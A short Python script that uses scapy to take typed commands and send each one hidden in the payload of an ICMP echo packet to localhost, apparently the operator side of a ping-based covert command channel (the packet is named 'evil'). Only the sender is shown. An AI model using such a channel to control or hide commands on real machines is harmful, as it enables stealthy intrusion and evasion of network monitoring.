from scapy.all import * 
from scapy.all import ICMP,IP

def main():
    while(True):
        command = input(">> ")
        arguments = command.split(" ")
        if arguments[0] == "":
            continue
        elif arguments[0] == "kill":
            break
        elif arguments[0] == "send":
            clientcommand = arguments[1] 
            evil = IP(dst="127.0.0.1")/ICMP(type=8)/(clientcommand)
            send(evil)

if __name__ == "__main__":
    main()